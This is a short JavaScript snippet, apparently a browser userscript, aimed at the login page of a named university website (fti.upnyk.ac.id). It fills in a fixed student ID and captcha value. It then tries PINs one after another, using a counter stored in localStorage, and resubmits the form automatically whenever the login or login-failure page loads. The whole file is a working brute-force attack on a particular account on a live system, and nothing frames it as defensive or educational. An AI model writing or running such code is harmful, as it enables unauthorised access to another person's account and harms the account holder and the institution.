const STORAGE_KEY = 'INDEX';
const STORAGE_PIN = 'PIN';
const nimEl = document.querySelector("input[name='user_id']");
const pinEl = document.querySelector("input[name='pwd0']");
const captcha = document.querySelector("input[name='fcaptcha']");
const form = document.querySelector('form');

let i = localStorage.getItem(STORAGE_KEY);
if (!i) i = 0;

if (nimEl) {
  i++;
  let pin;
  nimEl.value = 123210097;
  captcha.value = 1;

  pin = i;

  if (typeof Storage !== undefined) {
    localStorage.setItem(STORAGE_KEY, i);
    localStorage.setItem(STORAGE_PIN, pin);
  }

  pinEl.value = pin;

  if (
    window.location.href == 'http://fti.upnyk.ac.id/login.html' ||
    window.location.href == 'http://fti.upnyk.ac.id/menu01.html?login=fail'
  ) {
    form.submit();
  }
} else {
  console.log('error');
}
